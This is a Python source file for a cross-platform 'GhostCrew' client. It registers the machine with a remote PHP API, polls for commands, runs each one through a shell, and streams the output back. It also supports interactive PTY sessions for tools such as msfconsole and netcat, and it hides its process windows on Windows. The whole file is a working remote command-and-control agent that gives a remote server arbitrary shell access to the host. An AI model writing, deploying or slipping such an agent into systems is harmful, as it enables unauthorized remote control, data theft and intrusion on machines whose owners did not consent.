#!/usr/bin/env python3
"""
Cross-Platform GhostCrew Client with Interactive Command Support
Compatible with Windows and Linux systems
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import requests
import logging
import tempfile
import platform
from datetime import datetime, timedelta
from pathlib import Path

# Platform detection
IS_WINDOWS = platform.system().lower() == 'windows'
IS_LINUX = platform.system().lower() == 'linux'

# Platform-specific imports
if IS_WINDOWS:
    import msvcrt
    import ctypes
    from ctypes import wintypes
    try:
        import winpty
        HAS_WINPTY = True
    except ImportError:
        HAS_WINPTY = False
else:
    import pty
    import termios
    import fcntl
    import struct
    import select

# Enable debug logging
DEBUG_MODE = True

if DEBUG_MODE:
    logging.basicConfig(level=logging.DEBUG)

def debug_print(message):
    if DEBUG_MODE:
        print(f"[DEBUG] {message}")

class CrossPlatformCommandClient:
    def __init__(self, host_id, api_url, instance_token=None):
        self.host_id = host_id
        self.api_url = api_url
        self.instance_token = instance_token
        self.session_id = None
        self.current_process = None
        self.running = True
        self.output_buffer = []
        self.last_output_time = time.time()
        self.command_start_time = None
        self.interactive_mode = False
        self.current_command_id = None
        
        # Platform-specific setup
        self.setup_platform_specifics()
        
        # Interactive command patterns
        self.interactive_commands = {
            'telnet', 'ssh', 'ftp', 'sftp', 'mysql', 'psql', 'redis-cli',
            'python', 'python3', 'node', 'irb', 'bc', 'gdb', 'vim', 'nano',
            'less', 'more', 'top', 'htop', 'watch', 'tail', 'ping', 'msfconsole'
        }
        
        # Commands that typically run continuously
        self.continuous_commands = {
            'ping', 'tail', 'watch', 'top', 'htop', 'tcpdump', 'netstat'
        }
        
        # Platform-specific interactive commands
        if IS_WINDOWS:
            self.interactive_commands.update({
                'cmd', 'powershell', 'pwsh', 'netsh', 'diskpart', 'sqlcmd'
            })
            self.continuous_commands.update({
                'ping', 'netstat'
            })
        
        # Signal handlers (Windows handles differently)
        if not IS_WINDOWS:
            signal.signal(signal.SIGINT, self.signal_handler)
            signal.signal(signal.SIGTERM, self.signal_handler)
    
    def setup_platform_specifics(self):
        """Setup platform-specific configurations"""
        if IS_WINDOWS:
            # Windows-specific setup
            self.working_directory = os.getcwd()
            self.shell_command = ['cmd', '/c'] if not self.is_powershell_available() else ['powershell', '-Command']
            self.current_pty_master = None
            self.current_pty_slave = None
            
            # Enable ANSI colors on Windows 10+
            try:
                kernel32 = ctypes.windll.kernel32
                kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            except:
                pass
        else:
            # Linux-specific setup
            self.working_directory = os.getcwd()
            self.shell_command = ['/bin/bash', '-c']
            self.current_pty_master = None
            self.current_pty_slave = None
    
    def is_powershell_available(self):
        """Check if PowerShell is available on Windows"""
        try:
            subprocess.run(['powershell', '-Command', 'echo test'], 
                          capture_output=True, timeout=5)
            return True
        except:
            return False
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals (Unix only)"""
        print(f"Received signal {signum}, shutting down...")
        self.running = False
        self.cleanup_process()
        sys.exit(0)
    
    def start_heartbeat_thread(self):
        """Start heartbeat thread for interactive sessions"""
        def heartbeat_worker():
            last_ping = time.time()
            ping_interval = 15
            
            while self.interactive_mode and self.running:
                current_time = time.time()
                if current_time - last_ping >= ping_interval:
                    try:
                        if self.ping_host():
                            print(f"[HEARTBEAT] Ping successful at {time.strftime('%H:%M:%S')}")
                        else:
                            print(f"[HEARTBEAT] Ping failed at {time.strftime('%H:%M:%S')}")
                    except Exception as e:
                        print(f"[HEARTBEAT] Error: {e}")
                    last_ping = current_time
                
                time.sleep(5)
            
            print("[HEARTBEAT] Thread stopped")
        
        heartbeat_thread = threading.Thread(target=heartbeat_worker, daemon=True)
        heartbeat_thread.start()
        print("[HEARTBEAT] Thread started")
        return heartbeat_thread

    def register_host(self):
        """Register this host with the server"""
        try:
            hostname = platform.node() or 'unknown'
            
            # Get OS information
            if IS_WINDOWS:
                os_info = f"Windows {platform.release()}"
                try:
                    # Get IP address on Windows
                    result = subprocess.run(['ipconfig'], capture_output=True, text=True)
                    # Simple IP extraction (could be improved)
                    ip_address = "127.0.0.1"  # Fallback
                except:
                    ip_address = "127.0.0.1"
            else:
                try:
                    with open('/etc/os-release', 'r') as f:
                        os_info = f.read().split('\n')[0].replace('PRETTY_NAME=', '').strip('"')
                except:
                    os_info = f"Linux {platform.release()}"
                
                # Get IP address on Linux
                try:
                    result = subprocess.run(['hostname', '-I'], capture_output=True, text=True)
                    ip_address = result.stdout.strip().split()[0]
                except:
                    ip_address = "127.0.0.1"
            
            data = {
                'action': 'register_host',
                'host_id': self.host_id,
                'hostname': hostname,
                'ip_address': ip_address,
                'os_info': os_info
            }
            
            if self.instance_token:
                data['instance_token'] = self.instance_token
            
            response = requests.post(self.api_url, data=data, timeout=10)
            result = response.json()
            
            if result.get('status') == 'success':
                print(f"Host registered successfully: {hostname}")
                return True
            else:
                print(f"Failed to register host: {result.get('message', 'Unknown error')}")
                return False
                
        except Exception as e:
            print(f"Error registering host: {e}")
            return False
    
    def ping_host(self):
        """Send ping to keep host alive"""
        try:
            data = {
                'action': 'ping_host',
                'host_id': self.host_id,
                'is_interactive': self.interactive_mode
            }
            
            if self.instance_token:
                data['instance_token'] = self.instance_token
            
            response = requests.post(self.api_url, data=data, timeout=5)
            return response.json().get('status') == 'success'
        except Exception as e:
            print(f"Ping error: {e}")
            return False
    
    def get_command(self):
        """Get next command from server"""
        try:
            data = {
                'action': 'get_command',
                'host_id': self.host_id
            }
            
            if self.instance_token:
                data['instance_token'] = self.instance_token
            
            response = requests.post(self.api_url, data=data, timeout=10)
            result = response.json()
            
            if result.get('status') == 'success':
                command_id = result.get('command_id', 0)
                command = result.get('command', '').strip()
                session_id = result.get('session_id', '')
                
                if command_id > 0 and command:
                    return {
                        'command_id': command_id,
                        'command': command,
                        'session_id': session_id
                    }
            
            return None
            
        except Exception as e:
            print(f"Error getting command: {e}")
            return None
    
    def submit_result(self, command_id, output, execution_time, working_directory=None, exit_code=0):
        """Submit command result to server"""
        try:
            data = {
                'action': 'submit_result',
                'command_id': command_id,
                'output': output,
                'execution_time': execution_time,
                'working_directory': working_directory or self.working_directory,
                'exit_code': exit_code
            }
            
            response = requests.post(self.api_url, data=data, timeout=30)
            return response.json().get('status') == 'success'
            
        except Exception as e:
            print(f"Error submitting result: {e}")
            return False
    
    def stream_output_update(self, command_id, output, session_id, is_partial=True, chunk_sequence=1):
        """Send streaming output update to server"""
        try:
            # Ensure output is properly encoded
            if isinstance(output, bytes):
                for encoding in ['utf-8', 'latin1', 'cp1252']:
                    try:
                        output = output.decode(encoding)
                        break
                    except UnicodeDecodeError:
                        continue
                else:
                    output = output.decode('utf-8', errors='replace')
            
            data = {
                'action': 'stream_output',
                'command_id': command_id,
                'session_id': session_id,
                'output': output,
                'is_partial': is_partial,
                'chunk_sequence': chunk_sequence
            }
            
            debug_print(f"Streaming output for command {command_id}: {len(output)} chars")
            response = requests.post(self.api_url, data=data, timeout=10)
            
            if response.status_code != 200:
                print(f"HTTP error {response.status_code}: {response.text[:100]}")
                return
                
            try:
                result = response.json()
                if result.get('status') != 'success':
                    print(f"Failed to stream output: {result.get('message', 'Unknown error')}")
            except ValueError as e:
                print(f"JSON decode error in stream_output_update: {e}")
                print(f"Response content: {response.text[:200]}")
                
        except Exception as e:
            print(f"Error streaming output: {e}")
            debug_print(f"API URL: {self.api_url}")

    def check_for_input(self, session_id):
        """Check server for user input to send to interactive command"""
        try:
            data = {
                'action': 'get_user_input',
                'session_id': session_id,
                'host_id': self.host_id
            }
            
            response = requests.post(self.api_url, data=data, timeout=2)
            
            if response.status_code != 200:
                print(f"HTTP error {response.status_code} in check_for_input")
                return None
                
            try:
                result = response.json()
                if result.get('status') == 'success' and result.get('input'):
                    return result.get('input')
            except ValueError as e:
                print(f"JSON decode error in check_for_input: {e}")
                return None
            
        except Exception as e:
            print(f"Error checking for input: {e}")
        
        return None

    def is_interactive_command(self, command):
        """Determine if command is likely to be interactive"""
        command_parts = command.strip().split()
        if not command_parts:
            return False
        
        base_command = command_parts[0].split('/')[-1].split('\\')[-1]  # Handle both path separators
        
        print(f"Checking if command is interactive: {command}")
        print(f"Base command: {base_command}")
        
        # Check against known interactive commands
        if base_command.lower() in self.interactive_commands:
            print(f"Command {base_command} found in interactive_commands list")
            return True
        
        # Platform-specific patterns
        import re
        interactive_patterns = [
            r'^telnet\s+', r'^ssh\s+', r'^mysql\s+', r'^psql\s+',
            r'^python.*-i', r'^python3.*-i', r'^tail\s+.*-f',
            r'^watch\s+', r'^ping\s+', r'^nc\s+', r'^netcat\s+'
        ]
        
        # Windows-specific patterns
        if IS_WINDOWS:
            interactive_patterns.extend([
                r'^cmd\s*', r'^powershell\s*', r'^pwsh\s*',
                r'^netsh\s+', r'^diskpart\s*'
            ])
        
        for pattern in interactive_patterns:
            if re.match(pattern, command, re.IGNORECASE):
                print(f"Command matches interactive pattern: {pattern}")
                return True
        
        print(f"Command NOT detected as interactive: {command}")
        return False
    
    def is_continuous_command(self, command):
        """Check if command runs continuously"""
        command_parts = command.strip().split()
        if not command_parts:
            return False
        
        base_command = command_parts[0].split('/')[-1].split('\\')[-1].lower()
        return base_command in self.continuous_commands
    
    def execute_simple_command(self, command):
        """Execute a simple non-interactive command"""
        try:
            original_cwd = os.getcwd()
            os.chdir(self.working_directory)
            
            start_time = time.time()
            
            if IS_WINDOWS:
                # Windows command execution
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    cwd=self.working_directory,
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
                )
            else:
                # Linux command execution
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    cwd=self.working_directory
                )
            
            self.current_process = process
            
            # Wait for completion with timeout
            try:
                output, _ = process.communicate(timeout=300)  # 5 minute timeout
                exit_code = process.returncode
            except subprocess.TimeoutExpired:
                process.kill()
                output = "Command timed out after 5 minutes"
                exit_code = 124
            
            execution_time = time.time() - start_time
            
            # Update working directory if cd command
            if command.strip().lower().startswith('cd '):
                try:
                    self.working_directory = os.getcwd()
                except:
                    pass
            
            os.chdir(original_cwd)
            return output, execution_time, exit_code
            
        except Exception as e:
            execution_time = time.time() - start_time if 'start_time' in locals() else 0
            return f"Error executing command: {str(e)}", execution_time, 1
        finally:
            self.current_process = None
    
    def setup_pty_windows(self):
        """Set up pseudo-terminal for Windows (using winpty if available)"""
        if HAS_WINPTY:
            try:
                pty_process = winpty.PtyProcess.spawn(['cmd.exe'])
                return pty_process, None
            except Exception as e:
                print(f"Failed to create winpty process: {e}")
                return None, None
        else:
            # Fallback to regular subprocess for Windows
            return None, None
    
    def setup_pty_linux(self):
        """Set up pseudo-terminal for Linux"""
        master, slave = pty.openpty()
        
        # Set terminal size
        try:
            winsize = struct.pack('HHHH', 24, 80, 0, 0)
            fcntl.ioctl(slave, termios.TIOCSWINSZ, winsize)
        except:
            pass
        
        return master, slave
    
    def read_pty_output_windows(self, pty_process, command_id, session_id):
        """Read output from Windows PTY and stream to server"""
        if not pty_process:
            return ""
        
        output_chunks = []
        last_send_time = time.time()
        send_interval = 2.0
        chunk_sequence = 1
        
        print(f"Starting Windows output monitoring for command {command_id}")
        
        while self.interactive_mode and self.running:
            try:
                if pty_process.isalive():
                    data = pty_process.read(timeout=500)  # 500ms timeout
                    if data:
                        output_chunks.append(data)
                        print(f"Received {len(data)} chars: {repr(data[:100])}")
                        self.last_output_time = time.time()
                else:
                    break
                
                # Send periodic updates
                current_time = time.time()
                if current_time - last_send_time >= send_interval and output_chunks:
                    partial_output = ''.join(output_chunks)
                    print(f"Sending streaming update: {len(partial_output)} chars")
                    self.stream_output_update(command_id, partial_output, session_id, True, chunk_sequence)
                    output_chunks = []
                    last_send_time = current_time
                    chunk_sequence += 1
                
            except Exception as e:
                print(f"Error in Windows output reading: {e}")
                break
        
        # Send final output
        if output_chunks:
            final_output = ''.join(output_chunks)
            self.stream_output_update(command_id, final_output, session_id, False, chunk_sequence)
        
        return ''.join(output_chunks)
    
    def read_pty_output_linux(self, master_fd, command_id, session_id):
        """Read output from Linux PTY and stream to server"""
        output_chunks = []
        last_send_time = time.time()
        send_interval = 2.0
        chunk_sequence = 1
        
        print(f"Starting Linux output monitoring for command {command_id}")
        
        while self.interactive_mode and self.running:
            try:
                ready, _, _ = select.select([master_fd], [], [], 0.5)
                
                if ready:
                    try:
                        raw_data = os.read(master_fd, 1024)
                        data = None
                        for encoding in ['utf-8', 'latin1', 'cp1252', 'ascii']:
                            try:
                                data = raw_data.decode(encoding)
                                break
                            except UnicodeDecodeError:
                                continue
                        
                        if data is None:
                            data = raw_data.decode('utf-8', errors='replace')
                        
                        if data:
                            output_chunks.append(data)
                            print(f"Received {len(data)} chars: {repr(data[:100])}")
                            self.last_output_time = time.time()
                    except OSError as e:
                        print(f"PTY read error: {e}")
                        break
                
                # Send periodic updates
                current_time = time.time()
                if current_time - last_send_time >= send_interval and output_chunks:
                    partial_output = ''.join(output_chunks)
                    print(f"Sending streaming update: {len(partial_output)} chars")
                    self.stream_output_update(command_id, partial_output, session_id, True, chunk_sequence)
                    output_chunks = []
                    last_send_time = current_time
                    chunk_sequence += 1
                
                # Check for process completion
                if self.current_process and self.current_process.poll() is not None:
                    print(f"Process completed with exit code: {self.current_process.returncode}")
                    if output_chunks:
                        final_output = ''.join(output_chunks)
                        self.stream_output_update(command_id, final_output, session_id, False, chunk_sequence)
                    break
                
            except Exception as e:
                print(f"Error in Linux output reading: {e}")
                break
        
        # Send final output
        if output_chunks:
            final_output = ''.join(output_chunks)
            self.stream_output_update(command_id, final_output, session_id, False, chunk_sequence)
        
        return ''.join(output_chunks)
    
    def execute_interactive_command(self, command, command_id, session_id):
        """Execute an interactive command using platform-specific PTY"""
        start_time = time.time()
        execution_time = 0
        exit_code = 1
        
        try:
            print(f">>> Starting interactive execution for: {command}")
            self.interactive_mode = True
            self.current_command_id = command_id
            
            original_cwd = os.getcwd()
            os.chdir(self.working_directory)
            
            if IS_WINDOWS:
                # Windows interactive execution
                if HAS_WINPTY:
                    pty_process, _ = self.setup_pty_windows()
                    if pty_process:
                        print("Using winpty for Windows PTY")
                        pty_process.write(command + '\r\n')
                        
                        # Start output reading thread
                        output_thread = threading.Thread(
                            target=self.read_pty_output_windows,
                            args=(pty_process, command_id, session_id)
                        )
                        output_thread.daemon = True
                        output_thread.start()
                        
                        # Start heartbeat
                        heartbeat_thread = self.start_heartbeat_thread()
                        
                        # Main loop for Windows
                        last_input_check = time.time()
                        while self.interactive_mode and self.running:
                            if not pty_process.isalive():
                                break
                            
                            # Check for user input
                            current_time = time.time()
                            if current_time - last_input_check >= 1.0:
                                user_input = self.check_for_input(session_id)
                                if user_input:
                                    pty_process.write(user_input + '\r\n')
                                last_input_check = current_time
                            
                            if current_time - start_time > 1800:  # 30 min timeout
                                break
                            
                            time.sleep(1.0)
                        
                        self.interactive_mode = False
                        output_thread.join(timeout=5)
                        exit_code = 0 if pty_process.exitstatus is None else pty_process.exitstatus
                    else:
                        # Fallback to simple execution
                        return self.execute_simple_command(command)
                else:
                    # No winpty available, use simple execution
                    return self.execute_simple_command(command)
            
            else:
                # Linux interactive execution
                master, slave = self.setup_pty_linux()
                self.current_pty_master = master
                self.current_pty_slave = slave
                
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdin=slave,
                    stdout=slave,
                    stderr=slave,
                    preexec_fn=os.setsid,
                    cwd=self.working_directory
                )
                
                self.current_process = process
                os.close(slave)
                
                # Send initial output
                initial_output = f"Interactive command started: {command}\n"
                self.stream_output_update(command_id, initial_output, session_id, True, 1)
                
                time.sleep(1.0)
                
                # Start output reading thread
                output_thread = threading.Thread(
                    target=self.read_pty_output_linux,
                    args=(master, command_id, session_id)
                )
                output_thread.daemon = True
                output_thread.start()
                
                # Start heartbeat
                heartbeat_thread = self.start_heartbeat_thread()
                
                # Main loop for Linux
                last_input_check = time.time()
                while self.interactive_mode and self.running:
                    if process.poll() is not None:
                        break
                    
                    # Check for user input
                    current_time = time.time()
                    if current_time - last_input_check >= 1.0:
                        user_input = self.check_for_input(session_id)
                        if user_input:
                            try:
                                input_bytes = user_input.encode('utf-8')
                                if not user_input.endswith('\n'):
                                    input_bytes += b'\n'
                                os.write(master, input_bytes)
                            except Exception as e:
                                print(f"Error sending input to PTY: {e}")
                                break
                        last_input_check = current_time
                    
                    if current_time - start_time > 1800:  # 30 min timeout
                        break
                    
                    time.sleep(1.0)
                
                self.interactive_mode = False
                output_thread.join(timeout=5)
                
                # Cleanup
                try:
                    if process.poll() is None:
                        process.terminate()
                        time.sleep(2)
                        if process.poll() is None:
                            process.kill()
                    process.wait()
                except:
                    pass
                
                os.close(master)
                exit_code = process.returncode if process.returncode is not None else 0
            
            os.chdir(original_cwd)
            execution_time = time.time() - start_time
            
            return "", execution_time, exit_code
            
        except Exception as e:
            print(f"ERROR in execute_interactive_command: {e}")
            import traceback
            traceback.print_exc()
            self.interactive_mode = False
            execution_time = time.time() - start_time
            return f"Error executing interactive command: {str(e)}", execution_time, 1
        finally:
            self.cleanup_process()
    
    def cleanup_process(self):
        """Clean up current process and PTY"""
        if self.current_process:
            try:
                if self.current_process.poll() is None:
                    self.current_process.terminate()
                    time.sleep(1)
                    if self.current_process.poll() is None:
                        self.current_process.kill()
            except:
                pass
            self.current_process = None
        
        # Platform-specific cleanup
        if not IS_WINDOWS:
            if self.current_pty_master:
                try:
                    os.close(self.current_pty_master)
                except:
                    pass
                self.current_pty_master = None
            
            if self.current_pty_slave:
                try:
                    os.close(self.current_pty_slave)
                except:
                    pass
                self.current_pty_slave = None
        
        self.interactive_mode = False
        self.current_command_id = None
    
    def execute_command(self, command_data):
        """Execute a command (interactive or simple)"""
        command = command_data['command']
        command_id = command_data['command_id']
        session_id = command_data.get('session_id', '')
        
        print(f"=== EXECUTING COMMAND ===")
        print(f"Command: {command}")
        print(f"Command ID: {command_id}")
        print(f"Session ID: {session_id}")
        print(f"Platform: {'Windows' if IS_WINDOWS else 'Linux'}")
        
        # Handle built-in commands
        if command.strip().lower() == 'exit':
            return "Goodbye!", 0, 0
        
        if command.strip().lower().startswith('cd '):
            return self.handle_cd_command(command.strip())
        
        # Determine execution method
        is_interactive = self.is_interactive_command(command)
        is_continuous = self.is_continuous_command(command)
        
        print(f"Interactive: {is_interactive}")
        print(f"Continuous: {is_continuous}")
        
        if is_interactive or is_continuous:
            print(">>> USING PTY EXECUTION <<<")
            output, exec_time, exit_code = self.execute_interactive_command(
                command, command_id, session_id
            )
        else:
            print(">>> USING SIMPLE EXECUTION <<<")
            output, exec_time, exit_code = self.execute_simple_command(command)
        
        print(f"=== COMMAND COMPLETED ===")
        print(f"Exit code: {exit_code}")
        print(f"Execution time: {exec_time}")
        print(f"Output length: {len(output) if output else 0}")
        
        return output, exec_time, exit_code
    
    def handle_cd_command(self, command):
        """Handle directory change commands"""
        try:
            parts = command.split(None, 1)
            if len(parts) < 2:
                # cd with no arguments
                if IS_WINDOWS:
                    target_dir = os.path.expanduser('~')  # User profile on Windows
                else:
                    target_dir = os.path.expanduser('~')  # Home directory on Linux
            else:
                target_dir = os.path.expanduser(parts[1])
            
            original_dir = self.working_directory
            os.chdir(target_dir)
            self.working_directory = os.getcwd()
            
            if self.working_directory != original_dir:
                return f"Changed directory to: {self.working_directory}", 0, 0
            else:
                return f"Already in directory: {self.working_directory}", 0, 0
                
        except Exception as e:
            return f"cd: {str(e)}", 0, 1
    
    def run(self):
        """Main client loop"""
        print(f"Starting GhostCrew client for host: {self.host_id}")
        print(f"Platform: {platform.system()} {platform.release()}")
        print(f"Python: {sys.version}")
        
        # Register host
        if not self.register_host():
            print("Failed to register host, exiting...")
            return
        
        last_ping = time.time()
        ping_interval = 30
        
        while self.running:
            try:
                # Send periodic ping
                current_time = time.time()
                if current_time - last_ping >= ping_interval:
                    if not self.interactive_mode:
                        if not self.ping_host():
                            print("Failed to ping server")
                        last_ping = current_time
                    else:
                        last_ping = current_time
                
                # Get and execute commands
                if not self.interactive_mode:
                    command_data = self.get_command()
                    if command_data:
                        self.session_id = command_data.get('session_id')
                        
                        # Execute the command
                        output, exec_time, exit_code = self.execute_command(command_data)
                        
                        # Submit result
                        success = self.submit_result(
                            command_data['command_id'],
                            output,
                            exec_time,
                            self.working_directory,
                            exit_code
                        )
                        
                        if success:
                            print(f"Result submitted successfully (exit code: {exit_code})")
                        else:
                            print("Failed to submit result")
                    else:
                        time.sleep(2)
                else:
                    time.sleep(1)
                
            except KeyboardInterrupt:
                print("\nReceived interrupt signal, shutting down...")
                break
            except Exception as e:
                print(f"Error in main loop: {e}")
                time.sleep(5)
        
        self.cleanup_process()
        print("Client shutting down...")

def main():
    """Main entry point"""
    if len(sys.argv) < 3:
        print("Usage: python3 GhostCrew.py <api_url> <host_id> [instance_token]")
        print("Example: python3 GhostCrew.py http://192.168.1.171/GhostCrew/api.php my-host-123 inst_token_here")
        sys.exit(1)
    
    api_url = sys.argv[1]
    host_id = sys.argv[2]
    instance_token = sys.argv[3] if len(sys.argv) > 3 else None
    
    client = CrossPlatformCommandClient(host_id, api_url, instance_token)
    client.run()

if __name__ == "__main__":
    main()